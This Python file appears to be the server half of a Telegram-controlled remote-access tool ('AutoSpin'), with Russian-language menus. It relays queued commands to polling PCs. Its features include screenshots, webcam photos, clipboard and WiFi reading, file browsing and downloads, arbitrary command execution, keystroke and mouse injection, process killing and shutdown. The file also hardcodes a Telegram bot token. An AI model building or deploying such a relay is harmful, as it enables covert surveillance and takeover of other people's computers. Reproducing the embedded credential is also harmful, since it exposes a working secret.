# -*- coding: utf-8 -*-
"""AutoSpin — Railway cloud bot + relay server."""
import os, threading, time, json, uuid, io, base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
from urllib.parse import urlparse, parse_qs
import telebot
import telebot.types as tbt

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8885849371:AAEuwvVSy8j9KwF-xg3E_ECOqI9ekmRyDMY")
RC_OWNER  = os.environ.get("RC_OWNER",  "6222649520")
PORT      = int(os.environ.get("PORT",  7790))

# ── Relay state ────────────────────────────────────────────────────────────────
_relay_cmds    = {}  # {pc_name: [{job_id, action, params}, ...]}
_relay_results = {}  # {job_id: result}
_remote_reg    = {}  # {pc_name: {last_seen, ip}}
_lock          = threading.Lock()

def all_pcs():
    now = time.time()
    with _lock:
        return {n: v for n, v in _remote_reg.items() if now - v.get("last_seen", 0) < 120}

def _relay_send_cmd(pc_name, action, params=None):
    job_id = uuid.uuid4().hex[:10]
    with _lock:
        _relay_cmds.setdefault(pc_name, []).append(
            {"job_id": job_id, "action": action, "params": params or {}})
    for _ in range(60):
        time.sleep(0.5)
        with _lock:
            if job_id in _relay_results:
                return _relay_results.pop(job_id)
    return {"ok": False, "error": f"Таймаут: {pc_name} не ответил за 30 сек"}

def _forward(pc_name, action, params=None):
    with _lock:
        remote = _remote_reg.get(pc_name)
    if remote and time.time() - remote.get("last_seen", 0) < 120:
        return _relay_send_cmd(pc_name, action, params)
    return {"ok": False, "error": f"{pc_name} не в сети"}

# ── Relay HTTP server ──────────────────────────────────────────────────────────
class RelayHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            n = int(self.headers.get("Content-Length", 0))
            body = json.loads(self.rfile.read(n) or b"{}")
            path = self.path.split("?")[0]

            if path == "/register":
                name = body.get("name", "unknown")
                with _lock:
                    _remote_reg[name] = {"ip": self.client_address[0], "last_seen": time.time()}
                try:
                    telebot.TeleBot(BOT_TOKEN).send_message(
                        int(RC_OWNER), f"✅ {name} подключился!")
                except: pass
                self._ok({"ok": True})

            elif path.startswith("/result/"):
                job_id = path[8:]
                with _lock:
                    _relay_results[job_id] = body
                self._ok({"ok": True})

            else:
                self.send_error(404)
        except Exception as e:
            self.send_error(500, str(e))

    def do_GET(self):
        parsed = urlparse(self.path)
        qs     = parse_qs(parsed.query)

        if parsed.path == "/pending":
            name = qs.get("name", [""])[0]
            if not name:
                self._ok(None)
                return
            newly_registered = False
            with _lock:
                if name not in _remote_reg:
                    _remote_reg[name] = {"ip": self.client_address[0], "last_seen": time.time()}
                    newly_registered = True
                else:
                    _remote_reg[name]["last_seen"] = time.time()
                q = _relay_cmds.get(name)
                item = q.pop(0) if q else None
            if newly_registered:
                try:
                    telebot.TeleBot(BOT_TOKEN).send_message(
                        int(RC_OWNER), f"✅ {name} подключился!")
                except: pass
            self._ok(item)

        elif parsed.path == "/ping":
            name = qs.get("name", [""])[0]
            if name:
                with _lock:
                    if name not in _remote_reg:
                        _remote_reg[name] = {}
                    _remote_reg[name]["last_seen"] = time.time()
                    _remote_reg[name]["ip"] = self.client_address[0]
            self._ok({"ok": True})

        elif parsed.path == "/":
            self._ok({"status": "AutoSpin relay OK", "pcs": list(all_pcs().keys())})

        else:
            self.send_error(404)

    def _ok(self, data):
        b = json.dumps(data).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b)

    def log_message(self, *a): pass

def start_relay():
    srv = ThreadedHTTPServer(("0.0.0.0", PORT), RelayHandler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print(f"[relay] listening on :{PORT}", flush=True)

# ── Bot ────────────────────────────────────────────────────────────────────────
def run_bot():
    bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

    _sel  = {}  # {chat_id: pc_name}
    _wait = {}  # {chat_id: action}

    def B(t, d): return tbt.InlineKeyboardButton(t, callback_data=d)
    def KB(*rows):
        kb = tbt.InlineKeyboardMarkup()
        for row in rows: kb.row(*row)
        return kb

    def kb_back(): return KB([B("🔙 Меню", "menu")])
    def kb_ref(act): return KB([B("🔄 Обновить", act), B("🔙 Меню", "menu")])

    def kb_select_pc():
        pcs  = all_pcs()
        rows = [[B(f"🌐 {n}", f"sel|{n}")] for n in sorted(pcs)]
        if not pcs:
            rows.append([B("(нет устройств)", "refresh_pcs")])
        rows.append([B("🔄 Обновить список", "refresh_pcs")])
        return KB(*rows)

    def kb_main():
        return KB(
            [B("📸 Скриншот",   "screen"),    B("📷 Камера",      "photo")],
            [B("🖥 Система",    "m_system"),  B("🔊 Звук",         "m_sound")],
            [B("☀️ Экран",      "m_display"), B("⌨️ Управление",   "m_input")],
            [B("📁 Файлы",      "m_files"),   B("💬 Сообщения",    "m_messages")],
            [B("🎮 Процессы",   "m_procs"),   B("⚡ Питание",      "m_power")],
            [B("🔄 Сменить ПК", "choose_pc")],
        )

    def kb_system():
        return KB(
            [B("ℹ️ Инфо",    "sysinfo"),  B("⌚ Простой",  "idle")],
            [B("🌐 Сеть",    "netinfo"),  B("📶 WiFi",     "wifi")],
            [B("🔋 Батарея", "battery"),  B("🕐 Время",    "pctime")],
            [B("📋 Буфер",   "clip_get"), B("🔙 Меню",     "menu")],
        )

    def kb_sound(v=None):
        lbl = f"🔊 Громкость: {v}%" if v is not None else "🔊 Показать громкость"
        return KB(
            [B(lbl, "vol_get")],
            [B("🔕 0%","vol_set|0"), B("🔈 25%","vol_set|25"),
             B("🔉 50%","vol_set|50"), B("🔊 75%","vol_set|75"), B("💯 100%","vol_set|100")],
            [B("➖ −10","vol_adj|-10"), B("🔇 Мут","mute"), B("➕ +10","vol_adj|10")],
            [B("⏮ Пред","med|prev"), B("⏯ Play","med|play"),
             B("⏭ След","med|next"), B("⏹ Стоп","med|stop")],
            [B("🔙 Меню","menu")],
        )

    def kb_display(b=None):
        lbl = f"☀️ Яркость: {b}%" if b is not None else "☀️ Показать яркость"
        return KB(
            [B(lbl, "bright_get")],
            [B("🌑 0%","br_set|0"), B("🌒 25%","br_set|25"),
             B("🌓 50%","br_set|50"), B("🌔 75%","br_set|75"), B("☀️ 100%","br_set|100")],
            [B("➖ −10","br_adj|-10"), B("➕ +10","br_adj|10")],
            [B("🖼 Обои","ask|wallpaper")],
            [B("🔙 Меню","menu")],
        )

    def kb_input():
        return KB(
            [B("⌨️ Напечатать текст","ask|type"),  B("🔑 Нажать клавишу","ask|key")],
            [B("⌨️ Горячая клавиша","ask|hotkey"), B("🖱 Мышь → точка","ask|mouse")],
            [B("👆 Клик в точку","ask|click"),      B("📜 Скролл ↑","scroll|3")],
            [B("📜 Скролл ↓","scroll|-3"),          B("📜 Скролл ↑↑","scroll|10")],
            [B("🖥 Рабочий стол","hk|win+d"),       B("✖️ Alt+F4","hk|alt+f4")],
            [B("↩️ Ctrl+Z","hk|ctrl+z"),            B("📋 Ctrl+V","hk|ctrl+v")],
            [B("🔙 Меню","menu")],
        )

    def kb_files():
        return KB(
            [B("🖥 Рабочий стол", "dir|Desktop"),  B("📄 Документы", "dir|Documents")],
            [B("⬇️ Загрузки",     "dir|Downloads"),B("💾 Диск C:\\",  "dir|C:\\")],
            [B("📂 Открыть путь", "ask|open"),      B("📁 Путь к папке","ask|files")],
            [B("⬇️ Скачать файл","ask|download"),  B("💀 Убить процесс","ask|kill")],
            [B("🔙 Меню","menu")],
        )

    def kb_messages():
        return KB(
            [B("💬 Надпись на экране","ask|say"),  B("🔔 Уведомление","ask|notify")],
            [B("🌐 Открыть URL","ask|url"),         B("🔍 Поиск Google","ask|search")],
            [B("⌨️ Напечатать текст","ask|type"),  B("📋 В буфер → ПК","ask|clip_set")],
            [B("💻 Выполнить команду","ask|run"),   B("🔙 Меню","menu")],
        )

    def kb_procs():
        return KB(
            [B("📊 Топ RAM","tasks"),  B("⚙️ Топ CPU","topcpu")],
            [B("💀 Убить процесс","ask|kill")],
            [B("🔙 Меню","menu")],
        )

    def kb_power():
        return KB(
            [B("💤 Сон","sleep_go"),        B("❄️ Гибернация","hibernate_go")],
            [B("⚡ Выключить","sd_ask"),    B("🔄 Перезагрузить","rb_ask")],
            [B("🚫 Отмена выкл","abort_go"),B("🔒 Блокировка","lock")],
            [B("🔙 Меню","menu")],
        )

    def kb_confirm(act, label):
        return KB([B(f"✅ {label}", "conf|"+act), B("❌ Отмена", "m_power")])

    def sel(cid): return _sel.get(cid)

    def ok(msg): return str(msg.chat.id) == RC_OWNER

    def send_result(cid, result, reply_markup=None):
        rm = reply_markup or kb_back()
        if not result["ok"]:
            bot.send_message(cid, f"❌ {result['error']}", reply_markup=rm)
            return
        if result.get("type") == "photo":
            data = base64.b64decode(result["data"])
            buf  = io.BytesIO(data); buf.name = "img.jpg"
            bot.send_photo(cid, buf, caption=result.get("cap", ""), reply_markup=rm)
        else:
            bot.send_message(cid, result.get("text", ""), reply_markup=rm)

    def do(cid, action, params=None, reply_markup=None):
        pc = sel(cid)
        if not pc:
            bot.send_message(cid, "❌ Сначала выбери ПК", reply_markup=kb_select_pc())
            return
        send_result(cid, _forward(pc, action, params), reply_markup)

    def ask(cid, action, prompt):
        _wait[cid] = action
        bot.send_message(cid, prompt,
            reply_markup=tbt.ForceReply(selective=True,
                                        input_field_placeholder="Введи значение..."))

    # ── Handlers ──────────────────────────────────────────────────────────────
    @bot.message_handler(commands=["start", "menu"])
    def cmd_menu(msg):
        if not ok(msg): bot.send_message(msg.chat.id, "⛔ Нет доступа"); return
        _wait.pop(msg.chat.id, None)
        bot.send_message(msg.chat.id, "🖥 Выбери компьютер:", reply_markup=kb_select_pc())

    @bot.message_handler(commands=["pcs"])
    def cmd_pcs(msg):
        if not ok(msg): return
        pcs = all_pcs()
        text = "\n".join(f"🌐 {n}" for n in pcs) if pcs else "Нет подключённых ПК"
        bot.send_message(msg.chat.id, text)

    @bot.message_handler(content_types=["text"])
    def on_text(msg):
        if not ok(msg): return
        cid    = msg.chat.id
        action = _wait.pop(cid, None)
        if action is None: return
        text = msg.text.strip()
        params_map = {
            "say":       ("say",       {"text": text}),
            "notify":    ("notify",    {"text": text}),
            "url":       ("url",       {"url":  text}),
            "search":    ("search",    {"q":    text}),
            "type":      ("type",      {"text": text}),
            "key":       ("key",       {"combo":text}),
            "hotkey":    ("key",       {"combo":text}),
            "clip_set":  ("clip_set",  {"text": text}),
            "open":      ("open",      {"path": text}),
            "files":     ("files",     {"path": text}),
            "kill":      ("kill",      {"target":text}),
            "wallpaper": ("wallpaper", {"path": text}),
            "run":       ("run",       {"cmd":  text}),
            "download":  ("download",  {"url":  text}),
        }
        if action == "mouse":
            try:
                p = text.split()
                do(cid, "mouse", {"x": p[0], "y": p[1]})
            except: bot.send_message(cid, "❌ Формат: X Y", reply_markup=kb_back())
            return
        if action == "click":
            try:
                p = text.split()
                do(cid, "click", {"x": p[0], "y": p[1]})
            except: bot.send_message(cid, "❌ Формат: X Y", reply_markup=kb_back())
            return
        if action in params_map:
            a, p = params_map[action]
            do(cid, a, p)
        else:
            bot.send_message(cid, "❓ Неизвестное действие", reply_markup=kb_back())

    @bot.callback_query_handler(func=lambda c: True)
    def on_cb(call):
        if not ok(call.message): bot.answer_callback_query(call.id, "⛔"); return
        d   = call.data
        cid = call.message.chat.id
        mid = call.message.message_id
        bot.answer_callback_query(call.id)

        def edit(text, kb=None):
            try: bot.edit_message_text(text, cid, mid, reply_markup=kb)
            except: pass

        def rm():
            try: bot.delete_message(cid, mid)
            except: pass

        pc = sel(cid)

        try:
            if d.startswith("sel|"):
                name = d[4:]; _sel[cid] = name
                edit(f"🤖 {name} — управление:", kb_main())

            elif d in ("choose_pc", "refresh_pcs"):
                edit("🖥 Выбери компьютер:", kb_select_pc())

            elif d == "menu":       edit(f"🤖 {pc} — управление:", kb_main())
            elif d == "m_system":   edit(f"🖥 Система [{pc}]:", kb_system())
            elif d == "m_sound":    edit(f"🔊 Звук [{pc}]:", kb_sound())
            elif d == "m_display":  edit(f"☀️ Экран [{pc}]:", kb_display())
            elif d == "m_input":    edit(f"⌨️ Управление [{pc}]:", kb_input())
            elif d == "m_files":    edit(f"📁 Файлы [{pc}]:", kb_files())
            elif d == "m_messages": edit(f"💬 Сообщения [{pc}]:", kb_messages())
            elif d == "m_procs":    edit(f"🎮 Процессы [{pc}]:", kb_procs())
            elif d == "m_power":    edit(f"⚡ Питание [{pc}]:", kb_power())

            elif d == "screen":
                rm(); send_result(cid, _forward(pc, "screen"), kb_ref("screen"))
            elif d == "photo":
                rm(); send_result(cid, _forward(pc, "photo"), kb_ref("photo"))

            elif d == "sysinfo":
                r = _forward(pc, "sysinfo")
                edit(r.get("text","❌") if r["ok"] else f"❌ {r.get('error','')}", kb_system())
            elif d == "idle":    bot.send_message(cid, _forward(pc,"idle").get("text","❌"), reply_markup=kb_back())
            elif d == "netinfo": r=_forward(pc,"net");  edit(r.get("text",r.get("error","")), kb_ref("netinfo"))
            elif d == "wifi":    r=_forward(pc,"wifi"); edit(r.get("text",r.get("error","")), kb_ref("wifi"))
            elif d == "battery": r=_forward(pc,"battery"); edit(r.get("text",r.get("error","")), kb_ref("battery"))
            elif d == "pctime":  bot.send_message(cid, _forward(pc,"time").get("text","❌"), reply_markup=kb_back())
            elif d == "clip_get": bot.send_message(cid, _forward(pc,"clip_get").get("text","❌"), reply_markup=kb_back())

            elif d == "vol_get":
                r = _forward(pc, "vol_get")
                try: v = int(r["text"].replace("🔊 ","").replace("%",""))
                except: v = None
                edit(r.get("text","❌"), kb_sound(v=v))
            elif d.startswith("vol_set|"):
                v = int(d.split("|")[1]); _forward(pc,"vol_set",{"v":v})
                edit(f"🔊 {v}%", kb_sound(v=v))
            elif d.startswith("vol_adj|"):
                delta = int(d.split("|")[1]); r = _forward(pc,"vol_adj",{"d":delta})
                try: v = int(r["text"].replace("🔊 ","").replace("%",""))
                except: v = None
                edit(r.get("text","❌"), kb_sound(v=v))
            elif d == "mute":
                _forward(pc,"mute"); bot.send_message(cid,"🔕 Мут переключён", reply_markup=kb_back())

            elif d.startswith("med|"):
                k = d.split("|")[1]; _forward(pc,"media",{"k":k})
                labels={"play":"⏯","next":"⏭","prev":"⏮","stop":"⏹"}
                bot.answer_callback_query(call.id, labels.get(k,"🎵")+" OK")

            elif d == "bright_get":
                r = _forward(pc,"bright_get")
                try: b = int(r["text"].replace("☀️ ","").replace("%",""))
                except: b = None
                edit(r.get("text","❌"), kb_display(b=b))
            elif d.startswith("br_set|"):
                b = int(d.split("|")[1]); _forward(pc,"bright_set",{"v":b})
                edit(f"☀️ {b}%", kb_display(b=b))
            elif d.startswith("br_adj|"):
                delta = int(d.split("|")[1]); r = _forward(pc,"bright_adj",{"d":delta})
                try: b = int(r["text"].replace("☀️ ","").replace("%",""))
                except: b = None
                edit(r.get("text","❌"), kb_display(b=b))

            elif d.startswith("hk|"):
                combo = d[3:]; r = _forward(pc,"key",{"combo":combo})
                bot.send_message(cid, r.get("text",r.get("error","")), reply_markup=kb_back())

            elif d.startswith("scroll|"):
                n = int(d.split("|")[1]); _forward(pc,"scroll",{"n":n})

            elif d.startswith("dir|"):
                folder = d[4:]
                if folder in ("Desktop","Documents","Downloads"):
                    path = f"~\\{folder}"
                else:
                    path = folder
                r = _forward(pc,"files",{"path":path})
                edit(r.get("text",r.get("error","")), kb_back())

            elif d == "tasks":
                r = _forward(pc,"tasks"); edit(r.get("text","❌"), kb_procs())
            elif d == "topcpu":
                edit(f"⏳ Замеряю CPU на {pc}...", None)
                r = _forward(pc,"topcpu"); edit(r.get("text","❌"), kb_procs())

            elif d == "lock":
                _forward(pc,"lock"); bot.send_message(cid,"🔒 Заблокировано")

            elif d == "sleep_go":     r=_forward(pc,"sleep");     edit(r.get("text","❌"))
            elif d == "hibernate_go": r=_forward(pc,"hibernate"); edit(r.get("text","❌"))
            elif d == "abort_go":     r=_forward(pc,"abort");     edit(r.get("text","❌"), kb_back())
            elif d == "sd_ask":  edit(f"⚡ Выключить {pc}?", kb_confirm("sd","Да, выключить"))
            elif d == "rb_ask":  edit(f"🔄 Перезагрузить {pc}?", kb_confirm("rb","Да, перезагрузить"))
            elif d == "conf|sd": r=_forward(pc,"shutdown"); edit(r.get("text","❌"))
            elif d == "conf|rb": r=_forward(pc,"reboot");   edit(r.get("text","❌"))

            elif d.startswith("ask|"):
                action = d[4:]
                prompts = {
                    "say":       "💬 Введи текст для надписи на экране:",
                    "notify":    "🔔 Введи текст уведомления:",
                    "url":       "🌐 Введи URL:",
                    "search":    "🔍 Введи поисковый запрос:",
                    "type":      "⌨️ Введи текст для печати:",
                    "key":       "🔑 Введи клавишу/комбо (ctrl+c):",
                    "hotkey":    "⌨️ Введи хоткей:",
                    "clip_set":  "📋 Введи текст для буфера:",
                    "open":      "📂 Введи путь для открытия:",
                    "files":     "📁 Введи путь к папке:",
                    "kill":      "💀 Введи PID или имя процесса:",
                    "wallpaper": "🖼 Введи путь к файлу:",
                    "run":       "💻 Введи команду:",
                    "download":  "⬇️ Введи URL для скачивания:",
                    "mouse":     "🖱 Введи X Y (например: 960 540):",
                    "click":     "👆 Введи X Y (например: 960 540):",
                }
                if action in prompts:
                    rm(); ask(cid, action, prompts[action])

        except Exception as e:
            bot.send_message(cid, f"❌ Ошибка: {e}", reply_markup=kb_back())

    print("[bot] starting infinity_polling...", flush=True)
    bot.infinity_polling(timeout=30, long_polling_timeout=20)

# ── Entry point ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    start_relay()
    run_bot()
